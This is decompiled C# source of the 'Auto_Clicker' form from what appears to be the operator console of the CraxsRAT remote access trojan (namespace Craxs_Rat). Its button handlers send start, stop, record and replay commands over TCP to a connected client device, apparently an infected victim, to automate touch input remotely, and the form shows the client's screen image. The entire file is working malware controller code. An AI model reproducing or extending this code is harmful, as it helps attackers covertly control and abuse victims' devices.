using System;
using System.ComponentModel;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x02000036 RID: 54
	[DesignerGenerated]
	public partial class Auto_Clicker : Form
	{
		// Token: 0x060003EE RID: 1006 RVA: 0x00022698 File Offset: 0x00020898
		public Auto_Clicker()
		{
			base.Load += this.Auto_Clicker_Load;
			this.InitializeComponent();
		}

		// Token: 0x17000163 RID: 355
		// (get) Token: 0x060003F1 RID: 1009 RVA: 0x000028BF File Offset: 0x00000ABF
		// (set) Token: 0x060003F2 RID: 1010 RVA: 0x000232F8 File Offset: 0x000214F8
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x17000164 RID: 356
		// (get) Token: 0x060003F3 RID: 1011 RVA: 0x000028C7 File Offset: 0x00000AC7
		// (set) Token: 0x060003F4 RID: 1012 RVA: 0x0002330C File Offset: 0x0002150C
		internal virtual Label statustext { get; set; }

		// Token: 0x17000165 RID: 357
		// (get) Token: 0x060003F5 RID: 1013 RVA: 0x000028CF File Offset: 0x00000ACF
		// (set) Token: 0x060003F6 RID: 1014 RVA: 0x00023320 File Offset: 0x00021520
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x17000166 RID: 358
		// (get) Token: 0x060003F7 RID: 1015 RVA: 0x000028D7 File Offset: 0x00000AD7
		// (set) Token: 0x060003F8 RID: 1016 RVA: 0x00023334 File Offset: 0x00021534
		internal virtual Panel Panel3
		{
			[CompilerGenerated]
			get
			{
				return this._Panel3;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Panel3_MouseClick);
				Panel panel = this._Panel3;
				if (panel != null)
				{
					panel.MouseClick -= value2;
				}
				this._Panel3 = value;
				panel = this._Panel3;
				if (panel != null)
				{
					panel.MouseClick += value2;
				}
			}
		}

		// Token: 0x17000167 RID: 359
		// (get) Token: 0x060003F9 RID: 1017 RVA: 0x000028DF File Offset: 0x00000ADF
		// (set) Token: 0x060003FA RID: 1018 RVA: 0x00023378 File Offset: 0x00021578
		internal virtual Label Label1 { get; set; }

		// Token: 0x17000168 RID: 360
		// (get) Token: 0x060003FB RID: 1019 RVA: 0x000028E7 File Offset: 0x00000AE7
		// (set) Token: 0x060003FC RID: 1020 RVA: 0x0002338C File Offset: 0x0002158C
		internal virtual DrakeUIComboBox selectedrecord { get; set; }

		// Token: 0x17000169 RID: 361
		// (get) Token: 0x060003FD RID: 1021 RVA: 0x000028EF File Offset: 0x00000AEF
		// (set) Token: 0x060003FE RID: 1022 RVA: 0x000233A0 File Offset: 0x000215A0
		public virtual DrakeUIAvatar refreshbtn
		{
			[CompilerGenerated]
			get
			{
				return this._refreshbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.refreshbtn_Click);
				DrakeUIAvatar refreshbtn = this._refreshbtn;
				if (refreshbtn != null)
				{
					refreshbtn.Click -= value2;
				}
				this._refreshbtn = value;
				refreshbtn = this._refreshbtn;
				if (refreshbtn != null)
				{
					refreshbtn.Click += value2;
				}
			}
		}

		// Token: 0x1700016A RID: 362
		// (get) Token: 0x060003FF RID: 1023 RVA: 0x000028F7 File Offset: 0x00000AF7
		// (set) Token: 0x06000400 RID: 1024 RVA: 0x000233E4 File Offset: 0x000215E4
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon1_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon1 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x1700016B RID: 363
		// (get) Token: 0x06000401 RID: 1025 RVA: 0x000028FF File Offset: 0x00000AFF
		// (set) Token: 0x06000402 RID: 1026 RVA: 0x00023428 File Offset: 0x00021628
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon2_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon2 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x1700016C RID: 364
		// (get) Token: 0x06000403 RID: 1027 RVA: 0x00002907 File Offset: 0x00000B07
		// (set) Token: 0x06000404 RID: 1028 RVA: 0x0002346C File Offset: 0x0002166C
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon3;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon3_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon3 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x1700016D RID: 365
		// (get) Token: 0x06000405 RID: 1029 RVA: 0x0000290F File Offset: 0x00000B0F
		// (set) Token: 0x06000406 RID: 1030 RVA: 0x000234B0 File Offset: 0x000216B0
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon4;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon4_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon4 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x1700016E RID: 366
		// (get) Token: 0x06000407 RID: 1031 RVA: 0x00002917 File Offset: 0x00000B17
		// (set) Token: 0x06000408 RID: 1032 RVA: 0x000234F4 File Offset: 0x000216F4
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon5;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon5_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon5;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon5 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon5;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x1700016F RID: 367
		// (get) Token: 0x06000409 RID: 1033 RVA: 0x0000291F File Offset: 0x00000B1F
		// (set) Token: 0x0600040A RID: 1034 RVA: 0x00023538 File Offset: 0x00021738
		internal virtual PictureBox clientimage { get; set; }

		// Token: 0x0600040B RID: 1035 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_0(object sender, EventArgs e)
		{
		}

		// Token: 0x0600040C RID: 1036 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600040D RID: 1037 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_2(object sender, EventArgs e)
		{
		}

		// Token: 0x0600040E RID: 1038 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_3(object sender, EventArgs e)
		{
		}

		// Token: 0x0600040F RID: 1039 RVA: 0x0002354C File Offset: 0x0002174C
		public void method_4(object[] objects_0)
		{
			if (this.Panel3.InvokeRequired)
			{
				Auto_Clicker.GDelegate4 method = new Auto_Clicker.GDelegate4(this.method_4);
				this.Panel3.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				int num = Conversions.ToInteger(objects_0[0]);
				int num2 = Conversions.ToInteger(objects_0[1]);
				int num3 = Conversions.ToInteger(objects_0[2]);
				int num4 = Conversions.ToInteger(objects_0[3]);
				Graphics graphics = this.Panel3.CreateGraphics();
				Pen pen = new Pen(Color.Red, 10f);
				Point point = checked(new Point((int)Math.Round(unchecked((double)num * ((double)this.Panel3.Width / (double)num3))), (int)Math.Round(unchecked((double)num2 * ((double)this.Panel3.Height / (double)num4)))));
				graphics.DrawEllipse(pen, point.X, point.Y, 6, 6);
			}
		}

		// Token: 0x06000410 RID: 1040 RVA: 0x00023628 File Offset: 0x00021828
		public void method_5(object[] objects_0)
		{
			if (!this.statustext.InvokeRequired)
			{
				string text = Conversions.ToString(objects_0[0]);
				this.statustext.Text = text;
			}
			else
			{
				Auto_Clicker.GDelegate5 method = new Auto_Clicker.GDelegate5(this.method_5);
				this.statustext.Invoke(method, new object[]
				{
					objects_0
				});
			}
		}

		// Token: 0x06000411 RID: 1041 RVA: 0x00023680 File Offset: 0x00021880
		public void method_6(object[] objects_0)
		{
			if (this.selectedrecord.InvokeRequired)
			{
				Auto_Clicker.GDelegate6 method = new Auto_Clicker.GDelegate6(this.method_6);
				this.selectedrecord.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				string[] array = (string[])objects_0[0];
				foreach (string text in array)
				{
					try
					{
						if (!this.selectedrecord.Items.Contains(text))
						{
							this.selectedrecord.Items.Add(text);
							this.selectedrecord.Text = text;
							this.selectedrecord.Refresh();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
		}

		// Token: 0x06000412 RID: 1042 RVA: 0x0000246D File Offset: 0x0000066D
		private void Panel3_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000413 RID: 1043 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_8(object sender, EventArgs e)
		{
		}

		// Token: 0x06000414 RID: 1044 RVA: 0x0002374C File Offset: 0x0002194C
		private void refreshbtn_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"Aclk<*>[L]",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000415 RID: 1045 RVA: 0x00023864 File Offset: 0x00021A64
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"Aclk<*>Start",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000416 RID: 1046 RVA: 0x0002397C File Offset: 0x00021B7C
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"Aclk<*>Stop",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000417 RID: 1047 RVA: 0x00023A94 File Offset: 0x00021C94
		private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				Dialog1 dialog = new Dialog1();
				dialog.string_0 = "Enter Record Name";
				dialog.ShowDialog();
				if (dialog.DialogResult == DialogResult.OK)
				{
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						tcpClient_,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"Aclk<*>{Record,",
							dialog.string_1,
							"}",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
			}
		}

		// Token: 0x06000418 RID: 1048 RVA: 0x00023BE8 File Offset: 0x00021DE8
		private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
		{
			this.Panel3.Invalidate();
		}

		// Token: 0x06000419 RID: 1049 RVA: 0x00023C00 File Offset: 0x00021E00
		private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.selectedrecord.Text) | string.IsNullOrWhiteSpace(this.selectedrecord.Text))
			{
				Alert.ShowInformation("Select Record First");
			}
			else if (this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"Aclk<*>{Repet,",
						this.selectedrecord.Text,
						"}",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x0600041A RID: 1050 RVA: 0x00023D64 File Offset: 0x00021F64
		private void Auto_Clicker_Load(object sender, EventArgs e)
		{
			this.clientimage.Image = (Image)this.gclass8_0.objects_1[0];
		}

		// Token: 0x040001D8 RID: 472
		public GClass8 gclass8_0;

		// Token: 0x02000037 RID: 55
		// (Invoke) Token: 0x0600041E RID: 1054
		public delegate void GDelegate4(object[] objects_0);

		// Token: 0x02000038 RID: 56
		// (Invoke) Token: 0x06000422 RID: 1058
		public delegate void GDelegate5(object[] objects_0);

		// Token: 0x02000039 RID: 57
		// (Invoke) Token: 0x06000426 RID: 1062
		public delegate void GDelegate6(object[] objects_0);
	}
}
